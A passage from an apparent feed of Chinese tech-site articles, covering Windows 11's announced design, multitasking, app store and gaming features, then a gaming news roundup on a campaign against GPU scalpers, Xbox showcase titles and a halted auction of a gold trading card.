年来的首次大更新还是带来了不少可圈可点的更新看点，无论是外观设计到交互体验再到软件、游戏体验都有不少值得期待的地方。</p>\n<p>本文根据微软发布会上公布的相关视频及图片资料整理了大部分 Windows 11 的更新内容，希望能为你提供一些参考。</p>\n<p><strong>注：发布会视频及图片的展示内容与最终的实际体验可能会有差异。</strong></p>\n<h2>加入圆角与色彩潮流，还有新的开始菜单</h2>\n<p>相比 Windows 10，Windows 11 最直观的变化自然在外观设计。</p>\n<p>和泄露版展示的体验一样，Windows 11 将任务栏图标进行了居中处理。默认的任务栏图标包括开始菜单、搜索、桌面切换以及小组件（Widgets），开始菜单图标采用了与 Windows 11 相符的新设计，位置则依然在最左侧。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/7946ac6ab2f8621e38bcfaf003fa54bd.png\"><figcaption>新版任务栏布局</figcaption></figure><p>新版开始菜单正式弃用了「动态磁贴（Live Tiles）」这一标志性设计，没了大色块、直角和框线，布局更加清爽；结合宣传视频展示的内容和泄露版的现有体验，开始菜单除了允许用户固定常用 App 到面板中上部分，还会在面板下方提供应用和最近使用过的文档建议；老用户熟悉的所有应用列表入口则在面板右上方。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/6bb21bf43b496ca2620779059def6551\"><figcaption>新版开始菜单</figcaption></figure><p>从任务栏和开始菜单也不难看出，微软也将在 Windows 11 中启用一套全新的默认图标，这与微软今年对 Windows 图标的翻新工作可以说是一脉相承的。而除了这些我们在泄露版中已经体验过的内容，本次发布会公布的宣传视频中也给出了大量设计翻新细节，比如新版系统设置、新的主题系统、暗色模式等等。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/7fecdd4c192aaf23e10d138f2de21cfb\"><figcaption>新版系统设置</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/2a8d47417f5510e4d97c6806a2abff73\"><figcaption>新的主题系统</figcaption></figure><p>值得一提的是，在发布会后上传的 <a href=\"https://www.youtube.com/watch?v=g7y1S3wIysg\" target=\"_blank\">Watch how Windows 11 is being designed </a>视频中，微软还提到了 Windows 11 的整体设计理念变迁，包括对字体的重新设计（主要指不久前更新的 <a href=\"https://blogs.windows.com/windows-insider/2021/05/06/announcing-windows-10-insider-preview-build-21376/\" target=\"_blank\">Segeo UI 可变英文字体</a>），圆角、层次和阴影的运用，壁纸的动态，材质的模拟……以及色彩提取，没错，说到主题系统，最有意思的是和 Android 12 的 Material You 类似，Windows 11 也有一套能够从壁纸中取色并应用在系统 UI 中的主题系统，那个在视频中一闪而过的新版资源管理器就用到了这种取色方案。</p>\n<figure class=\"ss-imgRows\" figcaption=\"新版资源管理器\"><img src=\"https://cdn.sspai.com/2021/06/25/58648f8cc682a55232dc741eccd9425f.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/25/f46202267552b4e1607a16299a21efb9.jpg\" alt=\"\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/341507f2d708f7013c9ea53354a51e26\"><figcaption>全局主题</figcaption></figure><p>至于圆角，Windows 开发团队认为圆角的引入更加适合触屏交互形态，配合适当的色彩，也更能给人一种温润、柔软的可触碰感。除了 Windows 11 操作系统，我们在 Edge、Office 等微软自家应用中应该也能看到越来越多的圆角设计。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/6e095fefcfcc8076a6847e2fcd0d34a3\"><figcaption>Edge 与 Office 的圆角设计</figcaption></figure><h2>PowerToys 部分失业，多任务处理更方便</h2>\n<p>交互体验的改进是本次 Windows 11 的更新重点。</p>\n<p>贴靠布局（Snap Layouts）迎来了新的呈现形式，相比于 Windows 10 的需要依赖鼠标在显示器边缘触发，Windows 11 将方式重新整合进了最大化窗口按钮中。当我们把鼠标悬浮在最大化窗口按钮上时就可以看到各种贴靠方式，方便随时调用和排布。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/5d0c0e4405c80c985b70a12259effe56\"><figcaption>新的贴靠布局</figcaption></figure><p>Windows 11 的贴靠分组（Snap Groups）也会记住我们使用了哪些应用程序，还会将它们的贴靠布局记录下来。最典型的场景就是当前的工作被即时通讯消息打断了，依靠贴靠分组功能我们只需要再点击一次就能回到之前的应用和布局，继续推进工作。</p>\n<p>这个功能看起来很像是 Windows 10 中跳票多年的 Sets，也像是我们此前多此推荐过的 PowerToys 迎来了一次「转正」。</p>\n<p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/56719\" target=\"_blank\">微软出品的窗口管理工具，还能让你不再苦记快捷键：PowerToys</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/b7db2e9818a8e2b9efc8cf2724d10687\"><figcaption>贴靠分组功能可以快速回到之前的布局</figcaption></figure><p>更值得称道的是，Windows 11 中贴靠分组功能不仅会记住当前显示器的贴靠布局，还会记住所有外接显示器的贴靠布局。当我们重新将笔记本接到外接显示器上时，贴靠分组会自动还原之前的贴靠布局——在正确的显示器上打开对应的窗口，方便我们重新开展工作。微软还表示贴靠分组功能可以配合虚拟桌面使用，方便用户并行处理多个场景的任务。</p>\n<p>最后，Windows 11 还针对平板电脑以及其他触摸设备做了不少额外改进：断开物理键盘后，所有任务栏图标间距会自动增加，以适应更大的触摸范围并提供一定的视觉提示；Windows 11 还将把触摸板手势带到触摸屏上，带给用户更统一的触摸体验。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/79d7f6a8bfaf6f6169d307ac243d1174.png\"><figcaption>Windows 11 也将针对触摸体验进行优化</figcaption></figure><h2>全新应用商店，内置 Android 应用</h2>\n<p>比起外观和交互上的变化，Windows 11 的软件体验改进则可谓重磅。</p>\n<p>微软对 Windows 11 内置的 Microsoft Store 软件商店进行了架构上的重构，未来应用商店里除了包含 Windows 10 上已有的 UWP 应用外、也将支持上架 win32 应用甚至是 Android 应用。这当中有两个值得关注的点：</p>\n<p><strong>首先是应用商店政策</strong>。微软表示新版应用商店允许开发者自选结算系统，通过这种方式从商店中获取的收益将全数归开发者所有，微软不会进行任何抽成（后续微软也向 The Verge <a href=\"https://www.theverge.com/2021/6/24/22549222/microsoft-store-developers-windows-11-revenues-games\" target=\"_blank\">证实</a> 这一策略不适用于游戏）；如果开发者采用微软提供的结算系统，所得收入的抽成比例则会是 15%（应用）和 12%（游戏），比起 App Store 和 Google Play 依然可谓「实惠」。</p>\n<p><strong>另一方面，Windows 11 将原生支持运行 Android 应用</strong>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/f7560cefc0da1475a097220068312fcd\"><figcaption>新版应用商店</figcaption></figure><p>完全重塑一个自己的 Android 应用商店并不现实，所以在新版软件商店中，Android 应用的分发将依靠亚马逊应用商店，微软软件商店则负责内容展示；不过 Android 应用运行起来并不需要 Android 系统环境，可以和当前的 Windows 桌面环境完美适配，比如可以将应用固定在任务栏上。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/544ac7fa88ecfd7bd56deb477c837932\"><figcaption>运行抖音 Android 版的 Windows 11</figcaption></figure><p>唯一的限制是 Windows 11 中的 Android 应用显然没有 Google Play 框架可以依赖，Google 系的应用以及一些需要 Google Play 服务的应用在 Windows 11 上可能无法正常工作。</p>\n<p>借助开源的 Android 生态，微软似乎想「补全」其生态中一直缺失的重要一环 —— 也就是移动端。其实从 Apple 开始让 macOS 运行 iPadOS 应用就不难看出，未来桌面系统和移动系统的差别会越来越小，并且最终很有可能趋同、融合成同一个操作系统。</p>\n<p>除了应用商店，Windows 11 也将 Skype 淡出舞台并默认内置了 Microsoft Teams 作为沟通应用。和搜索、多任务处理类似，Teams 在 Windows 10 中甚至拥有一个独立的任务栏图标位置，点击任务栏图标即可快速开启 Teams 聊天面板；微软似乎想为 Windows 11 打造一个「Facetime」，而 Teams 这款既可以用在家庭、也可以用在商务办公领域的效率协作工具，就再适合不过了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/8f8c85194e8029362d176e003dababf6.jpg\"><figcaption>直接与 Windows 11 任务栏集成的 Microsoft Teams</figcaption></figure><p>最后，此前已经向 Windows 10 用户全量推送的「资讯和兴趣」面板在 Windows 11 中也进一步进化为独立的小部件（Widgets）功能，也就是新版任务栏中开始菜单右侧的第三个图标。从微软给出的演示来看，小部件面板除了展示用户关心的资讯卡片，还支持用户固定一些自己常用的 app 小部件，如微软待办、OneDrive、Edge 必应搜索等等。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/e6892ae86ee47858d33a6248fb908ef5.jpg\"><figcaption>小组件面板</figcaption></figure><h2>Xbox 技术下放，画质更好、加载更快</h2>\n<p>除了效率与沟通，游戏也是 Windows 11 的主打体验之一。在这里，坐拥 Xbox 游戏主机的微软可以说是来了一次全面的技术下放。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/ee913235124bf8c85cb4d152c258ea70.png\"><figcaption>左：正常游戏画面；右：自动 HDR 画面</figcaption></figure><p>比如此前为 Xbox Series X|S 独占的 Auto HDR 技术，在 Windows 11 中，只要游戏基于 DirectX 11 及以上版本开发，就能自动应用来自 Auto HDR 的画质升级，带来更宽广的动态范围和色彩质感。</p>\n<p>与之类似的，Xbox Series X|S 上那套全新的读写系统 —— DirectStorage 技术也将下放至 Windows 11。DirectStorage 能够减少游玩过程中后台材质串流所需要的读写性能需求，进而允许系统将 CPU 算力合理分配到图形、NPC 加载等其他任务上去，减少游戏加载时间并提升游戏体验。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/62570248643cf05b65e695602f8f7449.png\"><figcaption>GPU 直接可以从 NVMe 中读取素材，图源：Nvida</figcaption></figure><p>目前微软官方已在 Windows 11 <a href=\"https://www.microsoft.com/zh-cn/windows/windows-11-specifications\" target=\"_blank\">规格</a> 界面展示了 DirectStorage 和 Auto HDR 的具体硬件需求：DirectStorage 功能需要 NVMe SSD、使用「标准 NVM Express 控制器」驱动程序和支持 Shader Model 6.0 的 GPU；Auto HDR 则仅需一台支持 HDR 的显示器。</p>\n<p>此外微软还提到了一个名为「专为 DirectStorage 优化（DirectStorage Optimized）」的 Windows 11 PC 认证，这些设备估计可以开箱即用，直接享受到 DirectStorage 带来的游戏体验提升。</p>\n<p>最后，Windows 11 也将搭载全新的 Xbox 客户端，允许用户通过 Xbox Game Pass 享受到来自微软的庞大游戏阵容；订阅了 Xbox Game Pass Ultimate 的用户还能通过 Xbox app 进行 Xbox 云游戏串流。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/fb98206a301100b09cc407651ec40a83.jpg\"><figcaption>Xbox Game Pass for PC</figcaption></figure><p><strong>参考链接：</strong><a href=\"https://news.xbox.com/en-us/2021/06/24/windows-11-the-best-windows-ever-for-gaming/\" target=\"_blank\">Windows 11: The Best Windows Ever for Gaming - Xbox Wire</a></p>\n<h2>点评 &amp; 升级指南</h2>\n<p>Windows 11 的确是一次大更新，但整合版 Teams 在国内的网络表现，新版商店在国内应用商店审查策略下的最终体验，背靠 MSN 中文网低质量资讯来源的 Widgets……将这些部分刨除之后，它对大部分国内 Windows 用户来说就更像是一次界面与交互的更新了。</p>\n<p>而国内 Windows 用户对界面与交互的变化向来不怎么买账。</p>\n<p>如果你想尝鲜，下周一（6 月 28 日）开始就可以通过 Windows Insider 开发者预览计划的 Dev 通道体验到 Windows 11 测试版了，我们也将在第一时间上手进行体验；正式版预计将于 2022 年初推出，符合条件的 Windows 10 用户均可免费升级，你可以 <a href=\"https://aka.ms/GetPCHealthCheckApp\" target=\"_blank\">使用本工具</a> 检查你的电脑是否符合升级的要求。</p>\n<p>附·Windows 11 仅提供 64 位处理器支持，不会提供 32 位版本，硬件则需要符合以下标准：</p>\n<ul>\n<li>处理器：1GHz 或更快，在兼容的 64 位处理器或 SoC 上有 2 个或更多核心</li>\n<li>内存：4GB</li>\n<li>存储器：64GB 或更大的存储设备</li>\n<li>系统固件：UEFI，支持 Secure Boot</li>\n<li>TPM：可信平台模块（TPM）2.0 版</li>\n<li>图形卡：兼容 DirectX 12 或更高版本的 WDDM 2.0 驱动</li>\n<li>显示器：对角线大于 9 英寸的高清晰度（720p）显示器，每条颜色通道 8 比特</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，第一时间解读 Windows 动态 🐱‍🏍</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67413"},{"title":"瞎玩菌的游戏周报：「显卡战争」、Xbox 扩展发布会、天价法拍等","date":"2021-06-25 03:21:42","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>2021.6.25 尽量每周五更新</p>\n<p>《瞎玩菌的游戏周报》是我对游戏领域的观察和点评。具有以下特点：</p>\n<ul>\n<li>宁缺毋滥，为读者带来价值</li>\n<li>主观，但基于事实和数据</li>\n<li>有新鲜感，但时效性不强</li>\n<li>享受游戏，但反对沉迷游戏</li>\n<li>提升品位，但反对鄙视链</li>\n</ul>\n<h2>资讯</h2>\n<h3>在刚过去的 6.18 电商购物节，玩家发起了一场面向显卡黄牛的「战争」</h3>\n<p>原本用于玩游戏的显卡，如今一卡难求，众所周知，这是被矿老板们抢走了的缘故。囤积了显卡的黄牛们，在矿老板的掩护下，不谋而合地做起了高价显卡的生意。</p>\n<p>不久前，局势发生了变化：</p>\n<ul><li>今年 5 月，比特币（Bitcoin）、以太坊（ETH）等数字货币价格崩盘，其中比特币从 5 万多美元一路暴跌到 3 万多美元，并且下行势头还未停止。</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/cac658b3c1e8614988629270da7ef671.jpg\"><figcaption>图源 <a href=\"https://twitter.com/whyysooo/status/1394541748001546241\">Twitter deeksha</a></figcaption></figure><ul>\n<li>5 月 13 日，特斯拉 CEO 马一龙突然宣布暂停比特币支付，理由是「不环保」。这让比特币的局势如同雪中送冰淇淋。</li>\n<li>5 月 18 日，中国互联网金融协会、中国银行业协会、中国支付清算协会联合发布《<a href=\"http://www.xinhuanet.com/fortune/2021-05/18/c_1127461941.htm\">关于防范虚拟货币交易炒作风险的公告</a>》，明确指出金融机构、支付机构等机构不得开展与加密数字币相关的业务。</li>\n<li>5 月 21 日，中国的 <a href=\"http://www.gov.cn/xinwen/2021-05/21/content_5610192.htm\">国务院金融稳定发展委员会</a> 明确表态将打击虚拟货币的挖矿和交易行为，指出「打击比特币挖矿和交易行为，坚决防范个体风险向社会领域传递」。</li>\n<li>6月，<a href=\"https://mp.weixin.qq.com/s/Uq-9v82KIT4piWXw7GNomA\">内蒙古、四川</a> 等各地政府开始关停和清退矿场。要知道世界最大的矿池，大部分都在中国。</li>\n<li>6 月 21 日，<a href=\"https://weibo.com/1891502860/KldZL5Gpn\">支付宝</a> 发布《关于禁止使用我公司服务开展比特币等虚拟货币交易的声明 》。</li>\n</ul>\n<p>玩家期盼已久的「矿难」似乎就要来了。</p>\n<p>就在刚刚过去的 6.18，国内各大电商进行了一年一度的大促，其中显卡当然也是促销的商品类目之一。玩家久等的显卡终于等来了促销，不少黄牛商家促销的显卡依然比官方定价高出了一两千，只是比平时略微便宜了一点。然而忍痛下单的玩家熬着夜抢购显卡的结果是，商家假装上架销售，实际不发货，一直拖到订单过期。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/24/f3d6506ed3ac548f338704e96124a97d.jpg\"><figcaption>「三千预算进卡吧，加钱加到九万八」就是说的这里</figcaption></figure><p>玩家们终于忍无可忍，百度用户量最大的贴吧之一「<a href=\"https://www.tieba.com/f?kw=%E6%98%BE%E5%8D%A1\">显卡吧</a>」的玩家们率先站出来发起了反击——闲鱼（吧友称之为「海鲜市场」）突然上架了大量的「空气」显卡，这些显卡的共同特点是：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/64a157effd73a11b66a508428505188d.jpg\"></figure><ul>\n<li>平价：不仅不加价，甚至比官方定价还便宜。</li>\n<li>描述信息以假乱真：商品描述五花八门，为抛售显卡而编造的理由各异，堪比故事会。但描述里都用一句「懂得都懂」或「DDDD」来暗示这次行动。</li>\n<li>不发货：即使被看不懂暗号的买家拍下，卖家也不会给不明真相的买家发货，并劝说买家暂时不要购买显卡，让黄牛们把囤积的显卡「烂」在手里。</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/8f1f318906cb84e696106aa73a8129eb.png\"><figcaption>显卡吧制作的活动海报</figcaption></figure><p>这场活动的口号就是「你不买，我不买，明天还能降两百」。</p>\n<p>这场「以空气搏空气」活动的主角们很快扩散到了贴吧以外的其他平台，越来越多的人参与到了这场打垮黄牛的战争中。</p>\n<p>大规模行动的方式效果显著。由于闲鱼的机制，平价显卡排在搜索结果中更靠前的位置，而黄牛的高价显卡则被淹没在了平价显卡的汪洋大海中，得不到展示的机会。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/24/dbdc6d004cb033a0463480dfb693aa92.jpg\"></figure><p>受到影响的黄牛们气急败坏，除了一些破口大骂，还有一些哭诉起自己的损失巨大，承受不了。这让玩家们的情绪受到了鼓舞，他们参与行动的努力没有白费。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/09e6254ab8ad8fddcddaa20d53156323.jpg\"><figcaption>鳄鱼的眼泪</figcaption></figure><p>除了黄牛受到打击，受到「矿难」和政策双重影响，矿老板也连夜跑路。</p>\n<p>6 月 19 日，世界第五大矿池 BTC.com 收到了国网四川甘孜电力有限公司的 <a href=\"https://0xzx.com/2021062218001536598.html\">停电通知</a>，因此他们决定把矿机迁移到中国境外。6 月 22 日，他们宣布其第一批矿机成功迁移到哈萨克斯坦。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/23/1b8f8b2481d58020df5b536f7062945c.jpeg\"></figure><p>最后提醒一下各位持币待购显卡的玩家们，由于国内矿场关停，可能会有大量二手矿渣显卡经过翻新处理后，重新包装流入市场，请大家谨慎购买，仔细分辨，别贪便宜当了接盘侠。</p>\n<p>大不了就躺平做等等党，等到 40 系显卡出来再买。等待期间，对玩家来说可能是少玩会游戏，多踢会球或者看看剧，而对囤货的黄牛来说，压货占用的资金、仓储等可是实打实的损失。</p>\n<p>想玩游戏的玩家还可以考虑一下游戏主机，例如次世代的 PS5 和 XSX，同样内置了高端显卡，并且还不能挖矿，不用担心跟矿工竞争。不过这么想的可不止我一个，也有黄牛参与到了炒国行主机的热潮中，跟显卡黄牛一样，他们的做法无非是原价买，加价卖。</p>\n<p>对抗国行主机黄牛的玩家们也采用了同样的打法：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/23/f128c472c9a3630d09d6916b635445c3.jpg\"></figure><h3>E3 还不够，微软举办 Xbox 扩展版游戏发布会</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/19e8d4a7b9b111341333ae1dee679e52.jpg\"></figure><p>6 月 18 日，微软举办了 <a href=\"https://www.youtube.com/watch?v=L7ZCGAUSCAU\">Xbox 扩展版游戏发布会</a>（<a href=\"https://news.xbox.com/en-us/2021/06/17/xbox-games-showcase-extended-recap/\">Xbox Games Showcase Extended</a>），补充了一些在 E3 的 Xbox &amp; Bethesda 专场发布会没来得及充分展示的内容。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/a528931a845b9521e77688b08cc47737.jpg\"></figure><p>《<a href=\"https://www.xbox.com/en-US/games/forza-horizon-5\">极限竞速 地平线 5</a>》（Forza Horizon 5）是一封写给墨西哥的情书，其中充满了广阔、多样、不断发展的世界，具有惊人的对比和美感。玩家将能够带领令人叹为观止的探险队穿越墨西哥，在那里他们将发现活生生的沙漠、郁郁葱葱的丛林、历史悠久的城市、隐秘的遗迹、原始的海滩和高耸入云的雪山。游戏将在 11 月 9 日正式登陆 Xbox Series X|S、Win 10 商店、Steam 以及 Xbox Game Pass。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/1ef2304b1d047cc8d53abe142d7a5f09.jpg\"></figure><p>《<a href=\"https://www.xbox.com/en-US/games/senuas-saga-hellblade-II\">地狱之刃 2 塞纳传奇</a>》（Senua's Saga: Hellblade 2）的开发团队努力重现 9 世纪的冰岛，竭力为其土地和当时的服装带来真实感。他们还分享了一段 <a href=\"https://www.youtube.com/watch?v=a322kVx5vhc\">蒙太奇视频</a>，介绍了开发团队成员在工作中通过动作捕捉、动画或现场录音的情况，下面是 Xbox 官方的 B 站中文字幕版本（播放量很低，不愧为 B 站「最惨官方」账号之一）。</p> <p>《脑航员 2》（Psychonauts 2）的开发者做了游玩演示，并讲述了一部分剧情。为避免剧透这里就不多说了。不过不用等太久，游戏将会在 8 月 25 日发售。</p>\n<p>《The Anacrusis》是一款多人射击游戏，CEO Chet Faliszek 介绍了游戏如何动态适应不同玩家的游玩风格。</p>\n<p>《潜行者 2：切尔诺贝利之心》（S.T.A.L.K.E.R. 2: Heart of Chernobyl）演示了游戏更多的细节，例如一个新的派别，见到一些经典的场景。游戏将在 2022 年 4 月 28 日发售。</p>\n<p>《瘟疫故事：无罪》（A Plague Tale: Innocence）将于 7 月 6 日针对 Xbox Series X|S 进行优化，以支持 4K + 60 帧。这款游戏可以通过 XGP 游玩。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/3f6bd62ae040d73ff7cbb68e7a360f62.jpg\"></figure><p>《帝国时代 4》（Age of Empires IV）回顾了 E3 期间展示的一些令人兴奋的新内容，包括你可以在战斗中领导的另外两个文明，即阿巴斯王朝和法国人；百年战争战役，以圣女贞德为主角，也被披露为游戏中的英雄人物之一；以及海战。另外还独家披露了剩下的首发文明，神圣罗马帝国和罗斯，以及剩下的首发活动：莫斯科的崛起和蒙古帝国。玩家们可以在 10 月 28 日玩到《帝国时代 4》。</p>\n<p>《战地 2042》（Battlefield 2042）分享了这款多人游戏的一些新细节，比如他们如何做到在一张地图上最多有 128 名玩家，以及玩家如何创造他们自己独特的战地时刻。游戏还有陆上、空中和海上的全面战争体验。特别是征服游戏模式（Conquest game mode），它可以在这些巨大的地图上容纳许多不同的战斗，比如组队攻下各种目标，给《战地2042》的沙盒带来充分的自由度。游戏将在 10 月 22 日发售。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/bba24dce4c4a44262b9fe010156cd80a.jpg\"><figcaption>Jack Sparrow 船长</figcaption></figure><p>《盗贼之海：海盗的生活》（Sea of Thieves: A Pirate's Life）<a href=\"https://www.youtube.com/watch?v=bfBmlrLc7Ls\">演示</a> 了游戏玩法。《海盗的生活》是《盗贼之海》的一次大规模免费更新，它把电影《加勒比海盗》中的主角 Jack Sparrow 船长带入游戏，进行这次全新的冒险。下面是官方公布的一部分截图，你还可以在 <a href=\"https://news.xbox.com/en-us/2021/06/16/sea-of-thieves-a-pirates-life-gameplay-screenshots-revealed/\">这里</a> 下载更多原图。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/6d21c52c84d88e4bce629f760fa5cd3b.jpg\"><figcaption>黑珍珠号</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/7a7d76c545eebb40baceb666f44cabd6.jpg\"><figcaption>飞翔的荷兰人</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/2ce28ddb1181e2a1f59f6dc8c05af999.jpg\"><figcaption>水手之墓</figcaption></figure> <p>《微软模拟飞行》（Microsoft Flight Simulator）将于 7 月 27 日登陆 Xbox Series X|S。</p>\n<p>《哈迪斯》（Hades）将于 8 月 13 日登陆 Xbox Series X|S，并首日加入 XGP。</p>\n<p>ID@Xbox 游戏将加入 XGP。这意味着玩家可以在 XGP 中玩到更多独立游戏。下面这些 ID@Xbox  游戏将会在发售首日加入 XGP：</p>\n<ul>\n<li>《龙与地下城：黑暗联盟》（Dungeons and Dragons: Dark Alliance） (PC、云端和主机) - 6 月 22 日</li>\n<li>《崛起》（The Ascent）（PC、云端和主机）- 7 月 29 日</li>\n<li>《Sable》 (PC、云端和主机) - 9 月 23 日</li>\n<li>《Shredders》（云端和主机）- 2021 年 12 月</li>\n<li>《血根》（Bloodroots）(PC、云端和主机) - 2021年</li>\n<li>《你好邻居 2》（Hello Neighbor 2） (PC、云端和主机) - 2021年</li>\n<li>《The Gunk》(PC、云端和主机) - 2021年</li>\n<li>《战锤：黑潮》（Warhammer: Darktide）(PC、云端和主机) - 2021年</li>\n<li>《原子之心》（Atomic Heart）</li>\n<li>《中世纪王朝》主机版（Medieval Dynasty）</li>\n<li>《被取代》（Replaced）</li>\n<li>《Roboquest》</li>\n<li>《史莱姆牧场 2》（Slime Rancher 2）</li>\n<li>《Somerville》</li>\n<li>《潜行者 2：切尔诺贝利之心》（S.T.A.L.K.E.R. 2: Heart of Chernobyl）</li>\n</ul>\n<p>《禁闭求生》（Grounded）6 月 30 日将迎来大规模的内容更新，名叫《蘑菇与厄运》（Shroom &amp; Doom）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/5667b8280b3903431fb4ff119f79f8a3.jpg\"></figure><p>《光环 无限》（Halo Infinite）的开发者 343 工业公司介绍了多人模式的更多细节，包括了解更多关于斯巴达指挥官 Laurette 的情况，他负责监督斯巴达学院，学院的功能将教授游戏的基础知识，训练模式可以让你尝试使用武器和与机器人对战。开发者还详细介绍了大团队战——一种 12 对 12 的车辆融合模式。最后，他们分享了盔甲定制的更多细节，如 Yoroi 斯巴达盔甲，在《光环 无限》第一季中可以通过玩特别活动免费解锁。</p>\n<p>不久之后，玩家就有机会帮助塑造这种多人游戏体验。今年夏天，343 计划向有限的受众发布技术预览，所以一定要在 <a href=\"https://www.halowaypoint.com/en-us/community/halo-insider\">HaloInsider.com</a> 注册，以便有机会在这个假期游戏推出之前参与。</p>\n<p>该团队还强调，发布只是《光环无限》多人游戏旅程的开始，该游戏将在主机和 PC 上免费玩。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/d0a04ed9aa2d4cd6e6674a2ed025e4b9.jpg\"></figure><p>《猩红结系》（Scarlet Nexus）分享了 <a href=\"https://www.youtube.com/watch?v=FcJ8UV1ZwCA\">开发者</a> 如何用 4 年时间打造这个世界，让玩家近距离地、更详细地了解了这个游戏、它的世界，以及一切是如何形成的。</p> <p><a href=\"https://xboxdesignlab.xbox.com/\">Xbox 设计实验室</a> 回归！这是整场发布会讨论热度最高的亮点。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/a8c4875e317da7c928cdd382298319c7.jpg\"></figure><p>你可以进行个性化设计，创造一个属于你的控制器。玩家可以用 18 种颜色进行定制，包括新的颜色，如震荡蓝、脉冲红和电力黄，几乎所有的控制器外部部件，如机身、背壳、十字键、扳机键等都可以自定义，可以搭配出上百万种组合。Xbox 设计实验室在美国、加拿大和大多数西欧国家开放销售，起价 69.99 美元。</p>\n<p>希望这项服务开放到中国来，并且下一步可以考虑支持一下主机外观的定制。</p> <p>Xbox 相关一句话新闻：</p>\n<ul>\n<li><a href=\"https://www.polygon.com/interviews/22539158/xbox-game-studios-diversity-peter-wyse\">Xbox 游戏工作室执行官称工作重点是多样性——游戏、工作室和玩家的多样性</a></li>\n<li><a href=\"https://www.polygon.com/22536984/xbox-series-x-cloud-gaming-one-streaming\">Xbox One 将通过云串流方式玩到 Xbox Series X 游戏</a></li>\n</ul>\n<p>另外，少数派商店上架了来自 imPoi 的 Xbox / PlayStation 的手柄充电底座，券后 ￥89，其中 Xbox 款额外送两块电池 ，感兴趣的可以戳 <a href=\"https://sspai.com/post/67402\" target=\"_blank\">这里</a> 了解。</p>\n<h3>法拍《游戏王》<strong>纯金</strong>卡牌「青眼白龙」竞价到 8700 万被中止</h3>\n<p>6 月 21 日，市价在 20 ~ 30 万元的 20 周年纪念版「青眼白龙」《游戏王》纯金卡牌，在阿里司法拍卖中心，从 80 元的起拍价，一直竞拍到 8732.6 万元。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/cfa92b26f88cfba2ee5f71c121516389.jpg\"></figure><p>安徽省滁州市中级人民法院发现拍品与实际竞拍价格严重不符，可能存在恶意炒作与竞价行为，依法决定中止了拍卖。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img 